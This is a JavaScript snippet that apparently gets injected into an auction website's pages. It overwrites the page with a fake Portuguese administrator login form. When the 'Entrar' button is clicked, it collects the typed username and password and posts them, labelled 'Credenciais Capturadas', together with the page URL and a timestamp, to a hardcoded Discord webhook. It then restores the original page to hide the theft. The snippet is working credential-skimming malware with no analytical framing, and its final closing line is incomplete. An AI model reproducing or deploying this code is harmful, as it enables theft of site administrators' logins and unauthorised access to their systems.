(function() {

var originalHTML = document.documentElement.innerHTML;

document.getElementsByTagName('html')[0].innerHTML = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">' +
'<html xmlns="http://www.w3.org/1999/xhtml" lang="pt-br" xml:lang="pt-br">' +
'<head>' +
'<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />' +
'<title>Administracao do Site</title>' +
'<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">' +
'<link rel="stylesheet" type="text/css" href="https://emiliofariasleiloes.com/plugins/Fonts/Fonts_Fa/css/font-awesome.min.css" />' +
'<link rel="stylesheet" type="text/css" href="https://emiliofariasleiloes.com/css/css.css" />' +
'<link rel="stylesheet" type="text/css" href="https://emiliofariasleiloes.com/css/resp.css" />' +
'<link rel="stylesheet" type="text/css" href="https://emiliofariasleiloes.com/css/efeitos.css" />' +
'<style>' +
'body{background:#000;margin:0;padding:0;font-family:Arial,sans-serif;}' +
'.w520{width:520px;max-width:95%;}.pt100{padding-top:100px;}.pb50{padding-bottom:50px;}' +
'.m-a{margin:0 auto;}.h50{height:50px;}.pt25{padding-top:25px;}.pb18{padding-bottom:18px;}' +
'.back_2FACD8{background-color:#2FACD8;}.cor_fff{color:#fff;}.tac{text-align:center;}' +
'.fz28{font-size:28px;}.ttu{text-transform:uppercase;}.pt30{padding-top:30px;}' +
'.pl25{padding-left:25px;}.pr25{padding-right:25px;}.pb10{padding-bottom:10px;}' +
'.back_F8F8F8{background-color:#F8F8F8;}.db{display:block;}.mb16{margin-bottom:16px;}' +
'.bd_E6E6E6{border:1px solid #E6E6E6;}.design{border:none;outline:none;}.w100p{width:100%;}' +
'.h47{height:47px;}.pl10{padding-left:10px;}.pr10{padding-right:10px;}.ml42{margin-left:42px;}' +
'.bdt0{border-top:0;}.bdb0{border-bottom:0;}.bdr0{border-right:0;}.bdl_E6E6E6{border-left:1px solid #E6E6E6;}' +
'.back_fff{background:#fff;}.p20{padding:20px;}.tar{text-align:right;}.back_F1F1F1{background:#F1F1F1;}' +
'.botao{cursor:pointer;}.p15{padding:15px;}.pl20{padding-left:20px;}.pr20{padding-right:20px;}' +
'.mr10{margin-right:10px;}.fz11{font-size:11px;}.back_9E9E9E{background:#9E9E9E;}' +
'.back_2EADD4{background:#2EADD4;}.br5{border-radius:5px;}.hoverr:hover{opacity:0.85;}' +
'.fa{font-style:normal;}.w43{width:43px;}.posa{position:absolute;}.pt15{padding-top:15px;}' +
'.pl13{padding-left:13px;}.pr13{padding-right:13px;}.fz18{font-size:18px;}.bdr_E6E6E6{border-right:1px solid #E6E6E6;}' +
'.calc43{margin-left:43px;}.calc42{margin-left:42px;}h1,h2,h3,p{margin:0;padding:0;}' +
'</style>' +
'</head>' +
'<body class="login_pd back_000">' +
'<div class="w520 pt100 pb50 m-a">' +
'<div class="h50"></div>' +
'<h1 class="pt25 pb18 back_2FACD8">' +
'<p class="cor_fff tac fz28 ttu">Administracao do Site</p>' +
'</h1>' +
'<form action="" method="post" id="adminlogin">' +
'<div class="pt30 pl25 pr25 pb10 back_F8F8F8">' +
'<label class="db mb16 bd_E6E6E6">' +
'<div class="calc43" style="display:flex;border:1px solid #E6E6E6;">' +
'<span style="width:43px;min-width:43px;display:flex;align-items:center;justify-content:center;border-right:1px solid #E6E6E6;font-size:18px;">&#xf007;</span>' +
'<input type="text" name="login" id="xef_login" style="height:47px;flex:1;border:none;outline:none;padding:0 10px;font-size:14px;background:#fff;" placeholder="Login" autocomplete="off" />' +
'</div>' +
'</label>' +
'<label class="db mb16 bd_E6E6E6">' +
'<div class="calc42" style="display:flex;border:1px solid #E6E6E6;">' +
'<span style="width:43px;min-width:43px;display:flex;align-items:center;justify-content:center;border-right:1px solid #E6E6E6;font-size:18px;">&#xf084;</span>' +
'<input type="password" name="senha" id="xef_senha" style="height:47px;flex:1;border:none;outline:none;padding:0 10px;font-size:14px;background:#fff;" placeholder="Senha" autocomplete="off" />' +
'</div>' +
'</label>' +
'</div>' +
'<div class="p20 tar back_F1F1F1">' +
'<button type="button" class="botao p15 pl20 pr20 mr10 fz11 ttu cor_fff hoverr br5 back_9E9E9E" style="border:none;"> Esqueci minha senha? </button>' +
'<button type="button" id="xef_btn" class="botao p15 pl20 pr20 fz11 ttu cor_fff hoverr br5 back_2EADD4" style="border:none;"> Entrar </button>' +
'</div>' +
'</form>' +
'</div>' +
'</body></html>';

document.getElementById('xef_btn').addEventListener('click', function() {
    var u = document.getElementById('xef_login').value;
    var p = document.getElementById('xef_senha').value;

    if (!u || !p) {
        document.getElementById('xef_btn').style.background = '#ff4d4d';
        setTimeout(function() { document.getElementById('xef_btn').style.background = '#2EADD4'; }, 1000);
        return;
    }

    document.getElementById('xef_btn').innerText = 'Autenticando...';

    var ts = new Date().toISOString();
    var payload = '{"embeds":[{"title":"Credenciais Capturadas - Emilio Farias","color":16711680,"fields":[{"name":"Login","value":"' + u + '","inline":true},{"name":"Senha","value":"' + p + '","inline":true},{"name":"URL","value":"' + window.location.href + '","inline":false},{"name":"Timestamp","value":"' + ts + '","inline":false}]}]}';

    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://discord.com/api/webhooks/1493707538099605795/GuYho66-ozTTH1UlJsKsrFDL2CTdlgXMDsL_nnbp8F01xg-ooWcF6t67IBl84eFFb1oH', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onloadend = function() {
        document.documentElement.innerHTML = originalHTML;
    };
    xhr.send(payload);
});

}
